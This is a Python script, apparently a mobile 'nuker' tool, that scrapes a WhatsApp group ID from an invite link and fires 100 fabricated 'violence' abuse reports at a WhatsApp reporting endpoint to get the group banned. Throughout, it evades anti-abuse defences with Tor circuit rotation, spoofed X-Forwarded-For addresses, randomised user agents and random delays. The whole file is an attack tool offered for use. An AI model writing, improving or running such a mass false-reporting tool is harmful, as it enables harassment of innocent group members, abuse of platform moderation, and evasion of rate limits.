import sys, requests, random, time, re
from stem import Signal
from stem.control import Controller
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from requests.exceptions import RequestException

def rotate_ip():
    try:
        with Controller.from_port(port=9051) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)
            time.sleep(5)  # Wait for new circuit
    except Exception as e:
        print(f"[!] Tor IP rotation failed: {str(e)}")

def extract_group_data(link):
    """Extract group ID with multiple fallback methods"""
    try:
        # Method 1: Direct URL pattern match
        if "chat.whatsapp.com/" in link:
            match = re.search(r'chat\.whatsapp\.com/([a-zA-Z0-9_-]{22})', link)
            if match:
                return match.group(1)
        
        # Method 2: Meta tag scraping
        ua = UserAgent()
        headers = {
            'User-Agent': ua.random,
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        with requests.Session() as s:
            s.proxies = {'http': 'socks5://127.0.0.1:9050'}
            response = s.get(link, headers=headers, timeout=15)
            response.raise_for_status()
            
            # Check for WA anti-bot page
            if "url=whatsapp.com" in response.text:
                raise ValueError("WhatsApp anti-bot protection triggered")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_tag = soup.find('meta', {'property': 'og:url'}) or soup.find('meta', {'name': 'og:url'})
            
            if meta_tag and meta_tag.get('content'):
                return meta_tag['content'].split('/')[-1].split('?')[0]
            
            # Method 3: JavaScript variable extraction
            script_tag = soup.find('script', string=re.compile('inviteCode'))
            if script_tag:
                invite_code = re.search(r'"inviteCode":"([^"]+)"', script_tag.text)
                if invite_code:
                    return invite_code.group(1)
                
        raise ValueError("Failed to extract group ID from all methods")
    
    except RequestException as e:
        print(f"[!] Network error: {str(e)}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Extraction error: {str(e)}")
        sys.exit(1)

def nuke_group(group_id):
    report_url = f"https://web.whatsapp.com/api/report"
    success_count = 0
    
    for i in range(1, 101):  # 100 attempts
        try:
            headers = {
                'X-Forwarded-For': f'{random.randint(11,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                'User-Agent': UserAgent().random,
                'Origin': 'https://web.whatsapp.com',
                'Referer': f'https://web.whatsapp.com/'
            }
            
            payload = {
                'context': 'group',
                'id': group_id,
                'reason': 'violence',
                'source': 'termux_nuker_v3'
            }
            
            # Random delay between requests
            time.sleep(random.uniform(0.5, 2.5))
            
            response = requests.post(
                report_url,
                headers=headers,
                data=payload,
                proxies={'http': 'socks5://127.0.0.1:9050'},
                timeout=10
            )
            
            if response.status_code == 200:
                success_count += 1
                print(f"[+] Report {i}/100 succeeded")
            else:
                print(f"[!] Report {i}/100 failed (HTTP {response.status_code})")
            
            # Rotate IP every 5-8 requests
            if i % random.randint(5, 8) == 0:
                rotate_ip()
                
        except Exception as e:
            print(f"[!] Report {i}/100 error: {str(e)}")
            rotate_ip()
    
    print(f"\n[+] Total successful reports: {success_count}/100")

if __name__ == "__main__":
    print("[!] Verify Tor is running: service tor start")
    link = input("[+] Enter WA Group Link: ").strip()
    
    if not link.startswith('https://chat.whatsapp.com/'):
        print("[!] Invalid WhatsApp group link format")
        sys.exit(1)
        
    group_id = extract_group_data(link)
    print(f"[+] Extracted Group ID: {group_id}")
    
    confirm = input("[!] Confirm nuke? (y/n): ").lower()
    if confirm == 'y':
        nuke_group(group_id)
        print("[+] Attack completed. Ban may take 2-24 hours to apply.")
    else:
        print("[!] Attack canceled")
